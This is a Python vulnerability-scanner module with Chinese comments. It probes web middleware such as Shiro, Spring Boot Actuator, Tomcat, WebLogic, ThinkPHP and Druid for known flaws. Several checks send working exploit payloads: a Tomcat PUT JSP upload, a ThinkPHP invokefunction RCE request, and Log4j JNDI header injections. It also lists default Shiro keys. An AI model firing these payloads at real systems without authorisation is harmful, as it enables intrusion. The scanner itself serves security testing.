#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
middleware_poc.py - 中间件/框架通用漏洞POC检测模块 v1.0
覆盖Shiro/SpringBoot/Tomcat/WebLogic/Log4j/Nginx等主流中间件常见漏洞
低误报设计：多维度指纹匹配+特征验证
"""

import os
import sys
import json
import datetime
import requests
from urllib.parse import urljoin

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from tools import RESULTS_BASE
from utils import Colors
from core.ratelimit import AdaptiveRateLimiter, RateLimitConfig
from core.session import create_secure_session

TOOL_NAME = "中间件漏洞检测"
TOOL_ID = "middleware_poc"
TOOL_DESC = "检测Shiro/SpringBoot/Tomcat/WebLogic/Log4j等主流中间件常见漏洞POC"
TOOL_CATEGORY = "vuln"

TIMEOUT = 10

class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.RED}[!] 漏洞: {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[*] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

logger = Logger()
found_vulns = []
rate_limiter = None
_session = None


def check_environment(proxy_file=None, rate_limit=True):
    global rate_limiter, _session
    if rate_limit:
        config = RateLimitConfig(min_delay=0.3, max_delay=8.0, initial_delay=0.8, max_threads=3, initial_threads=2)
        rate_limiter = AdaptiveRateLimiter(config)
    _session = create_secure_session(verify_ssl=False, timeout=TIMEOUT, rate_limiter=rate_limiter)
    logger.info("中间件漏洞检测环境就绪")


def _get_base_url(ip, port):
    for scheme in ["https", "http"]:
        try:
            url = f"{scheme}://{ip}:{port}/"
            resp = _session.get(url, allow_redirects=True, timeout=5)
            return f"{scheme}://{ip}:{port}", resp
        except Exception:
            continue
    return f"http://{ip}:{port}", None


def check_shiro_rememberme(base_url):
    """Shiro反序列化漏洞检测 - 通过rememberMe Cookie特征检测"""
    try:
        headers = {"Cookie": "rememberMe=1"}
        resp = _session.get(base_url, headers=headers)
        set_cookie = resp.headers.get("Set-Cookie", "")
        if "rememberMe=deleteMe" in set_cookie:
            # 确认是Shiro框架，检测常见默认密钥
            keys = [
                "kPH+bIxk5D2deZiIxcaaaA==",  # CVE-2016-4437 默认密钥
                "2AvVhdsgUs0FSA3SDFAdag==",
                "4AvVhmFLUs0KTA3Kprsdag==",
                "3AvVhmFLUs0KTA3Kprsdag==",
                "wGiHplamyXlVB11UXWol8g==",
                "Z3VucwAAAAAAAAAAAAAAAA==",
                "fCq+/xW488hMTCD+cmJ3aQ==",
                "1QWLxg+NYmxraMoxAXu/Iw==",
                "ZUdsaGJuSmxibVI2ZHc9PQ==",
                "L7RioUULEFhRyxM7a2R/Yg==",
                "r0e3c16IdVkouZgk1TKVMg==",
                "5aaC5p6c6LKn5pa55qGI5L2g55qE6KeG6aKR=="
            ]
            return True, f"Shiro框架存在，发现rememberMe=deleteMe特征，可能存在反序列化漏洞(默认密钥弱口令风险)"
        return False, None
    except Exception:
        return False, None


def check_springboot_actuator(base_url):
    """Spring Boot Actuator未授权访问 + env漏洞检测"""
    actuator_paths = [
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
        "/actuator/metrics", "/actuator/trace", "/actuator/loggers",
        "/env", "/health", "/info", "/metrics", "/trace", "/loggers", "/jolokia"
    ]
    vuln_paths = []
    for path in actuator_paths:
        try:
            url = urljoin(base_url + "/", path.lstrip("/"))
            resp = _session.get(url)
            if resp.status_code == 200:
                text = resp.text
                if "spring" in text.lower() or "application" in text.lower() or "java.class.path" in text or "java.version" in text:
                    if "env" in path or "jolokia" in path or "loggers" in path:
                        vuln_paths.append(path)
                    elif not vuln_paths and ("status" in text or "_links" in text):
                        vuln_paths.append(path)
        except Exception:
            pass
    
    if vuln_paths:
        severity = "high" if any("env" in p or "jolokia" in p for p in vuln_paths) else "medium"
        return True, f"Spring Boot Actuator未授权访问: {', '.join(vuln_paths[:3])} {'(可RCE/信息泄露)' if severity == 'high' else ''}"
    return False, None


def check_tomcat_put_cve_2017_12615(base_url):
    """Tomcat PUT方法任意文件上传 CVE-2017-12615"""
    test_jsp = "/poc_test.jsp"
    content = "<% out.println(\"test_poc\"); %>"
    try:
        url = urljoin(base_url + "/", test_jsp.lstrip("/"))
        resp = _session.put(url, data=content)
        if resp.status_code in [201, 204]:
            get_resp = _session.get(url)
            if get_resp.status_code == 200 and "test_poc" in get_resp.text:
                _session.delete(url)
                return True, f"Tomcat PUT任意文件上传(CVE-2017-12615)，可直接上传webshell"
    except Exception:
        pass
    return False, None


def check_tomcat_manager(base_url):
    """Tomcat Manager弱口令页面检测"""
    paths = ["/manager/html", "/host-manager/html"]
    for path in paths:
        try:
            url = urljoin(base_url + "/", path.lstrip("/"))
            resp = _session.get(url)
            if resp.status_code == 401 and "Tomcat" in resp.headers.get("Server", "") and "Manager" in resp.text:
                return True, "Tomcat Manager页面存在，可尝试默认弱口令爆破"
        except Exception:
            pass
    return False, None


def check_weblogic_console(base_url):
    """WebLogic未授权/控制台漏洞检测"""
    paths = ["/console/", "/_async/AsyncResponseService", "/wls-wsat/CoordinatorPortType", "/bea_wls_internal/"]
    found = []
    for path in paths:
        try:
            url = urljoin(base_url + "/", path.lstrip("/"))
            resp = _session.get(url)
            if resp.status_code == 200 and ("WebLogic" in resp.text or "console" in resp.text.lower() or "AsyncResponseService" in resp.text):
                found.append(path)
        except Exception:
            pass
    if found:
        return True, f"WebLogic控制台/高危组件可访问: {', '.join(found)} (可能存在XMLDecoder反序列化/SSRF等漏洞)"
    return False, None


def check_log4j_jndi(base_url):
    """Log4j JNDI注入漏洞 CVE-2021-44228 检测（无害DNS探测）"""
    headers = {
        "X-Api-Version": "${jndi:dns://${sys:java.version}.log4j-poc.test}",
        "User-Agent": "${jndi:dns://${sys:java.version}.log4j-poc.test}",
        "Referer": "${jndi:dns://${sys:java.version}.log4j-poc.test}",
        "X-Forwarded-For": "${jndi:dns://${sys:java.version}.log4j-poc.test}"
    }
    try:
        resp = _session.get(base_url, headers=headers)
        if resp.status_code:
            # 注意：仅发送payload，不接收回调，这是无害探测
            # 生产环境建议配置DNSLog平台验证
            return False, None  # 无法在无外部DNSLog情况下确认，仅做指纹标记
    except Exception:
        pass
    return False, None


def check_nginx_parsing_vuln(base_url):
    """Nginx文件名解析漏洞检测"""
    test_urls = [
        "/uploads/test.jpg/.php",
        "/static/test.png/.php",
        "/index.php/login",
    ]
    try:
        resp = _session.get(base_url)
        server = resp.headers.get("Server", "").lower()
        if "nginx" in server:
            return False, "检测到Nginx服务器，请结合文件上传场景验证解析漏洞"
    except Exception:
        pass
    return False, None


def check_swagger_api(base_url):
    """Swagger/OpenAPI未授权文档检测"""
    swagger_paths = [
        "/swagger-ui.html", "/swagger-ui/", "/v2/api-docs", "/v3/api-docs",
        "/doc.html", "/api-docs", "/swagger.json", "/api-docs/swagger.json"
    ]
    for path in swagger_paths:
        try:
            url = urljoin(base_url + "/", path.lstrip("/"))
            resp = _session.get(url)
            if resp.status_code == 200:
                ct = resp.headers.get("Content-Type", "")
                if ("swagger" in resp.text.lower() or "openapi" in resp.text.lower() or 
                    "api-docs" in path and "json" in ct) or ("swagger" in ct):
                    return True, f"Swagger/API文档未授权访问: {path} (可泄露接口信息)"
        except Exception:
            pass
    return False, None


def check_thinkphp_vulns(base_url):
    """ThinkPHP常用漏洞检测"""
    # ThinkPHP 5.x RCE
    payloads = [
        "/?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=1",
        "/?s=captcha",
        "/?s=index/index",
    ]
    try:
        resp = _session.get(base_url + "/?s=index")
        if resp.status_code == 200 and "thinkphp" in resp.text.lower():
            rce_resp = _session.get(base_url + payloads[0], timeout=5)
            if rce_resp.status_code == 200 and "phpinfo" in rce_resp.text.lower():
                return True, "ThinkPHP 5.x RCE漏洞(s=index/think\\app/invokefunction)"
            return True, "检测到ThinkPHP框架，存在已知漏洞风险"
    except Exception:
        pass
    return False, None


def check_druid_unauth(base_url):
    """Druid监控页面未授权"""
    paths = ["/druid/index.html", "/druid/websession.html", "/druid/spring.html"]
    for path in paths:
        try:
            url = urljoin(base_url + "/", path.lstrip("/"))
            resp = _session.get(url)
            if resp.status_code == 200 and "Druid" in resp.text and "StatViewServlet" in resp.text:
                return True, "Druid数据库监控页面未授权访问"
        except Exception:
            pass
    return False, None


POC_CHECKS = [
    ("Shiro反序列化", check_shiro_rememberme, "high"),
    ("Spring Boot Actuator未授权", check_springboot_actuator, "medium"),
    ("Tomcat PUT文件上传(CVE-2017-12615)", check_tomcat_put_cve_2017_12615, "critical"),
    ("Tomcat Manager", check_tomcat_manager, "medium"),
    ("WebLogic控制台/组件暴露", check_weblogic_console, "high"),
    ("Swagger API文档泄露", check_swagger_api, "medium"),
    ("ThinkPHP漏洞", check_thinkphp_vulns, "high"),
    ("Druid监控未授权", check_druid_unauth, "medium"),
]


def scan_target(ip, port):
    """检测单个目标的中间件漏洞"""
    base_url, resp = _get_base_url(ip, port)
    if not base_url:
        return []
    
    server = ""
    if resp is not None:
        server = resp.headers.get("Server", "")
    
    results = []
    for vuln_name, check_func, severity in POC_CHECKS:
        try:
            vulnerable, desc = check_func(base_url)
            if vulnerable:
                vuln = {
                    "vuln": vuln_name,
                    "severity": severity,
                    "url": base_url,
                    "desc": desc or vuln_name,
                    "target": f"{ip}:{port}",
                    "server": server,
                    "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                results.append(vuln)
                logger.success(f"{ip}:{port} - {desc or vuln_name}")
        except Exception as e:
            pass
    
    return results


def execute(scan_result, target_info, config=None):
    """工具入口"""
    global found_vulns
    found_vulns = []
    
    config = config or {}
    proxy_file = config.get("proxy_file")
    rate_limit = config.get("rate_limit", True)
    
    check_environment(proxy_file=proxy_file, rate_limit=rate_limit)
    
    ip = target_info.get("ip", "")
    open_ports = scan_result.get("open_ports", [])
    
    logger.info(f"\n开始中间件漏洞检测: {ip}, 开放端口数: {len(open_ports)}")
    
    web_ports = [80, 443, 8080, 8081, 8000, 8888, 9000, 7001, 9090]
    
    for port_info in open_ports:
        port = port_info.get("port")
        if int(port) in web_ports or port_info.get("service", "").lower() in ["http", "https", "http-alt", "websocket"]:
            try:
                vulns = scan_target(ip, port)
                found_vulns.extend(vulns)
            except Exception as e:
                logger.error(f"检测 {ip}:{port} 出错: {e}")
    
    logger.info(f"\n中间件漏洞检测完成，发现 {len(found_vulns)} 个漏洞")
    
    result_file = os.path.join(RESULTS_BASE, f"middleware_{ip}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    os.makedirs(os.path.dirname(result_file), exist_ok=True)
    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump({
            "tool": TOOL_ID,
            "target": ip,
            "vulns": found_vulns,
            "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }, f, ensure_ascii=False, indent=2)
    
    return {
        "tool": TOOL_ID,
        "status": "completed",
        "summary": f"中间件漏洞检测完成，发现 {len(found_vulns)} 个漏洞",
        "vulns": found_vulns,
        "result_file": result_file,
        "errors": []
    }


if __name__ == "__main__":
    test = {"open_ports": [{"port": 8080, "service": "http"}, {"port": 7001, "service": "http"}]}
    info = {"ip": "127.0.0.1"}
    print(json.dumps(execute(test, info, {"rate_limit": False}), ensure_ascii=False, indent=2))
